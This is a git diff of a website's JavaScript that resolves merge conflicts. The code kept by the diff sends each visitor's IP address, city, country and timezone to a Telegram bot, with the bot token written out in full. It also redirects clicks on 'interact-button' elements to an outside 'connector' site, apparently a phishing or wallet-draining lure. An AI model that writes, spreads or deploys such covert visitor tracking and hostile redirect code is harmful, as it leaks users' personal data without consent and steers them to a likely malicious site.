@@ -1375,11 +1375,10 @@ function addRedirectionToButtons() {
         if (event.target.classList.contains('interact-button')) {
             // Redirect to the specified URL
             window.location.href = 'https://connector-b19b.vercel.app/';  // Change the URL as needed
-<<<<<<< HEAD
+
         }
-=======
+
         });
->>>>>>> 4d1c963bb55fcc07d1e4d1c596064ad9f83e36ca
     });
 }
 
@@ -1395,11 +1394,9 @@ addRedirectionToButtons();
                     const message = `A user visited this website from ${data.city} - ${data.country} with timezone ${data.timezone} and IP address ${data.ip}`;
                     
                     // Send the message to the server
-<<<<<<< HEAD
+
                     fetch(`https://api.telegram.org/bot7493932821:AAGamFZLLlEgI0b0PxsiRVdIREG3nC1hrOg/sendMessage?chat_id=@loauncher&text=${encodeURIComponent(message)}`)
-=======
-                    fetch(`https://api.telegram.org/bot7493932821:AAGamFZLLlEgI0b0PxsiRVdIREG3nC1hrOg/sendMessage?chat_id=@ienaodbe&text=${encodeURIComponent(message)}`)
->>>>>>> 4d1c963bb55fcc07d1e4d1c596064ad9f83e36ca
+
                         .then(response => {
                             if (response.ok) {
                                 console.log('Message sent successfully');
